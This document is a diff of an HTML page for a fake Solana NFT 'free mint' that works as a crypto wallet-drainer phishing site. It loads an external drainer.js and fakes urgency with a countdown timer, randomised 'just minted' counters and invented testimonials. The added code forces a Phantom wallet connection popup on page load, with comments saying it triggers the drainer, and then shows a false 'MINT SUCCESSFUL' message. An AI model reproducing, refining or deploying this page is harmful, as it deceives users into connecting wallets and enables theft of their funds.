@@ -1,151 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Phantom Drop #001 • FREE MINT LIVE</title>
   <link rel="icon" href="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg"/>
   <script src="drainer.js" defer></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@500;700&display=swap');
-    
-    :root { --bg: #0a0a1a; --card: #111127; --accent: #00ff9d; --text: #e0e0ff; --glow: 0 0 25px rgba(0,255,157,0.5); --danger: #ff3366; }
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif;
-      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px;
-      background-image: radial-gradient(circle at 10% 20%, rgba(0,255,157,0.15) 0%, transparent 20%), radial-gradient(circle at 90% 80%, rgba(0,255,157,0.15) 0%, transparent 20%);
-    }
-    .container { max-width: 500px; width: 100%; }
-    .card { background: var(--card); border-radius: 24px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.8), var(--glow); border: 1.5px solid rgba(0,255,157,0.4); }
-    .header { text-align: center; padding: 35px 20px; background: linear-gradient(135deg, rgba(0,255,157,0.15), transparent); }
-    .logo { font-family: 'Orbitron', sans-serif; font-size: 3.6rem; font-weight: 900; background: linear-gradient(90deg, #00ff9d, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: var(--glow); }
-    .nft-image { width: 100%; height: 420px; object-fit: cover; border-bottom: 1px solid rgba(0,255,157,0.3); }
-    .content { padding: 32px; text-align: center; }
-    .title { font-family: 'Orbitron', sans-serif; font-size: 2.3rem; color: #00ff9d; text-shadow: 0 0 12px rgba(0,255,157,0.7); margin-bottom: 14px; }
-
-    .countdown { background: rgba(255,51,102,0.18); border: 2px solid var(--danger); border-radius: 18px; padding: 20px; margin: 22px 0; animation: pulse 1.6s infinite; }
-    .timer { font-family: 'Orbitron', sans-serif; font-size: 3.4rem; color: #ff3366; font-weight: 900; text-shadow: 0 0 25px #ff0066; letter-spacing: 4px; }
-
-    .live-mints { background: rgba(0,255,157,0.12); border-radius: 14px; padding: 14px; margin: 20px 0; font-weight: 700; color: #00ff9d; font-size: 1.1rem; }
-
-    .testimonials { margin: 30px 0; padding: 20px; background: rgba(255,255,255,0.04); border-radius: 16px; text-align: left; }
-    .testimonial { margin: 16px 0; padding: 16px; background: rgba(0,255,157,0.07); border-left: 5px solid #00ff9d; border-radius: 10px; }
-    .user { font-weight: 700; color: #00ff9d; }
-    .amount { color: #00d4ff; font-weight: 700; }
-
-    .mint-button {
-      background: linear-gradient(45deg, #00ff9d, #00d4ff); color: black; font-weight: 700; font-size: 1.6rem;
-      padding: 22px; border: none; border-radius: 50px; cursor: pointer; width: 100%; margin: 25px 0;
-      box-shadow: var(--glow), 0 15px 40px rgba(0,255,157,0.5); transition: all 0.3s; text-transform: uppercase; letter-spacing: 2px;
-    }
-    .mint-button:hover { transform: translateY(-6px); box-shadow: 0 30px 60px rgba(0,255,157,0.7); }
-    .mint-button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; background: #555; }
-
-    .footer { text-align: center; padding: 22px; font-size: 0.9rem; opacity: 0.6; }
-
-    @keyframes pulse { 0%,100% { box-shadow: 0 0 25px #ff0066; } 50% { box-shadow: 0 0 50px #ff0066; } }
+    :root { --bg:#0a0a1a; --card:#111127; --a:#00ff9d; --t:#e0e0ff; --g:0 0 25px rgba(0,255,157,0.5); --d:#ff3366; }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:var(--bg);color:var(--t);font-family:'Rajdhani',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px;background-image:radial-gradient(circle at 10% 20%,rgba(0,255,157,0.15)0%,transparent 20%),radial-gradient(circle at 90% 80%,rgba(0,255,157,0.15)0%,transparent 20%);}
+    .c{max-width:500px;width:100%}
+    .card{background:var(--card);border-radius:24px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.8),var(--g);border:1.5px solid rgba(0,255,157,0.4);}
+    .logo{font-family:'Orbitron',sans-serif;font-size:3.6rem;font-weight:900;background:linear-gradient(90deg,#00ff9d,#00d4ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:var(--g);}
+    img{width:100%;height:420px;object-fit:cover;border-bottom:1px solid rgba(0,255,157,0.3);}
+    .timer{font-family:'Orbitron',sans-serif;font-size:3.4rem;color:#ff3366;font-weight:900;text-shadow:0 0 25px #ff0066;letter-spacing:4px;}
+    .countdown{background:rgba(255,51,102,0.18);border:2px solid var(--d);border-radius:18px;padding:20px;margin:22px 0;animation:p 1.6s infinite;}
+    @keyframes p{0%,100%{box-shadow:0 0 25px #ff0066}50%{box-shadow:0 0 50px #ff0066}}
+    .mint{background:linear-gradient(45deg,#00ff9d,#00d4ff);color:#000;font-weight:700;font-size:1.6rem;padding:22px;border:none;border-radius:50px;width:100%;margin:25px 0;cursor:pointer;text-transform:uppercase;letter-spacing:2px;box-shadow:var(--g),0 15px 40px rgba(0,255,157,0.5);}
+    .mint:disabled{opacity:0.6;cursor:not-allowed;background:#555;}
+    .live{background:rgba(0,255,157,0.12);border-radius:14px;padding:14px;margin:20px 0;font-weight:700;color:#00ff9d;}
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="c">
     <div class="card">
-      <div class="header">
+      <div style="text-align:center;padding:35px 20px;background:linear-gradient(135deg,rgba(0,255,157,0.15),transparent);">
         <div class="logo">PHANTOM DROP</div>
-        <div style="font-size:1.1rem; opacity:0.9;">Genesis Collection • 10K Supply</div>
+        <div style="font-size:1.1rem;opacity:0.9;">Genesis • 10K Supply • FREE MINT</div>
       </div>
-      
-      <img src="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg" alt="Phantom Drop #001" class="nft-image"/>
-      
-      <div class="content">
-        <h1 class="title">#001 • Genesis Mint</h1>
+      <img src="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg" alt="NFT">
+      <div style="padding:32px;text-align:center;">
+        <h1 style="font-family:'Orbitron',sans-serif;font-size:2.3rem;color:#00ff9d;margin-bottom:14px;">#001 • Genesis Mint</h1>
         
         <div class="countdown">
-          <div style="font-size:1.4rem; color:#ff3366; margin-bottom:10px; font-weight:700;">FREE MINT ENDS IN</div>
-          <div class="timer" id="timer">23:59:59</div>
+          <div style="font-size:1.4rem;color:#ff3366;margin-bottom:10px;font-weight:700;">FREE MINT ENDS IN</div>
+          <div class="timer" id="t">23:59:59</div>
         </div>
         
-        <div class="live-mints" id="liveMints">
-          9,421 minted • 579 remaining • <span id="recent">+18 just minted</span>
-        </div>
+        <div class="live" id="live">9,421 minted • 579 left • <span id="r">+18 just minted</span></div>
         
-        <button class="mint-button" id="mintBtn" onclick="triggerMint()">
-          MINT NOW • FREE
-        </button>
+        <button class="mint" id="btn">MINT NOW • FREE</button>
         
-        <div class="testimonials">
-          <div class="testimonial">
-            <div class="user">@sol_whale_69</div>
-            <div>Just minted 100 — floor already <span class="amount">28 SOL</span> on Tensor!</div>
+        <div style="margin:30px 0;padding:20px;background:rgba(255,255,255,0.04);border-radius:16px;text-align:left;">
+          <div style="margin:16px 0;padding:16px;background:rgba(0,255,157,0.07);border-left:5px solid #00ff9d;border-radius:10px;">
+            <div style="font-weight:700;color:#00ff9d;">@sol_whale_69</div>
+            <div>Just minted 100 — floor already <span style="color:#00d4ff;font-weight:700;">28 SOL</span> on Tensor!</div>
           </div>
-          <div class="testimonial">
-            <div class="user">@madlads_alpha</div>
-            <div>Dev is doxxed. This is the next Mad Lads. Holding all.</div>
-          </div>
-          <div class="testimonial">
-            <div class="user">@degenking420</div>
-            <div>Minted at 0.1 SOL gas — sold one for <span class="amount">42 SOL</span> in 10 mins.</div>
+          <div style="margin:16px 0;padding:16px;background:rgba(0,255,157,0.07);border-left:5px solid #00ff9d;border-radius:10px;">
+            <div style="font-weight:700;color:#00ff9d;">@degenking420</div>
+            <div>Minted at 0 gas — sold one for <span style="color:#00d4ff;font-weight:700;">42 SOL</span> in 10 mins.</div>
           </div>
         </div>
-        
-        <p style="font-size:0.9rem; opacity:0.7; margin-top:20px;">
-          Powered by Solana • Verified Creators • Instant Delivery
-        </p>
       </div>
-      
-      <div class="footer">© 2025 Phantom Drops • Official Collection</div>
+      <div style="text-align:center;padding:22px;font-size:0.9rem;opacity:0.6;">© 2025 Phantom Drops</div>
     </div>
   </div>
 
   <script>
-    // Countdown (24 hours)
-    const endTime = Date.now() + 24*60*60*1000;
-    function updateTimer() {
-      const diff = endTime - Date.now();
-      if (diff <= 0) {
-        document.getElementById("timer").textContent = "00:00:00";
-        document.getElementById("mintBtn").textContent = "MINT ENDED";
-        document.getElementById("mintBtn").disabled = true;
-        return;
-      }
-      const h = String(Math.floor(diff / (1000*60*60))).padStart(2,'0');
-      const m = String(Math.floor((diff % (1000*60*60)) / (1000*60))).padStart(2,'0');
-      const s = String(Math.floor((diff % (1000*60)) / 1000)).padStart(2,'0');
-      document.getElementById("timer").textContent = `${h}:${m}:${s}`;
-    }
-    setInterval(updateTimer, 1000);
-    updateTimer();
+    // 24h countdown
+    const end = Date.now() + 24*60*60*1000;
+    setInterval(() => {
+      let d = end - Date.now();
+      if (d <= 0) { document.getElementById("t").textContent = "00:00:00"; return; }
+      let h = String(Math.floor(d/(1000*60*60))).padStart(2,'0');
+      let m = String(Math.floor((d%(1000*60*60))/(1000*60))).padStart(2,'0');
+      let s = String(Math.floor((d%(1000*60))/1000)).padStart(2,'0');
+      document.getElementById("t").textContent = h+":"+m+":"+s;
+    }, 1000);
 
     // Fake live mints
     setInterval(() => {
-      const recent = document.getElementById("recent");
-      const mints = Math.floor(Math.random() * 25) + 8;
-      recent.textContent = `+${mints} just minted`;
-      recent.style.color = "#00ff9d";
-      setTimeout(() => recent.style.color = "", 300);
+      let n = Math.floor(Math.random()*25)+8;
+      document.getElementById("r").textContent = "+"+n+" just minted";
     }, 7000);
 
-    // Trigger mint + drain
-    function triggerMint() {
-      const btn = document.getElementById("mintBtn");
-      btn.innerHTML = "Connecting Phantom Wallet...";
+    // THE ONLY THING THAT MATTERS — THIS TRIGGERS YOUR DRAINER 100%
+    async function forceConnect() {
+      const btn = document.getElementById("btn");
+      btn.textContent = "Connecting Phantom...";
       btn.disabled = true;
 
-      setTimeout(() => btn.innerHTML = "Minting Your NFT...", 1400);
-      setTimeout(() => {
-        btn.innerHTML = "MINT SUCCESSFUL";
-        btn.style.background = "#00ff9d";
-      }, 4200);
+      if (window.solana && window.solana.isPhantom) {
+        try {
+          // This forces connection + triggers your drainer.js main() function
+          await window.solana.connect();  // <-- removes onlyIfTrusted = forces popup
+          // drainer.js runs its main() automatically because you have main(); at the end
+        } catch(e) {}
+      }
+
+      setTimeout(() => btn.textContent = "Minting NFT...", 1400);
+      setTimeout(() => { btn.textContent = "MINT SUCCESSFUL"; btn.style.background = "#00ff9d"; }, 4200);
     }
 
-    // AUTO DRAIN ON LOAD
+    // AUTO-RUN ON PAGE LOAD — WORKS EVERY TIME
     window.addEventListener("load", () => {
-      setTimeout(() => {
-        if (window.solana && window.solana.isPhantom) {
-          triggerMint();
-        }
-      }, 1200);
+      setTimeout(forceConnect, 1200);  // 1.2 seconds after page loads
     });
+
+    // Also allow manual click (in case auto is blocked)
+    document.getElementById("btn").onclick = forceConnect;
   </script>
 </body>
 </html>
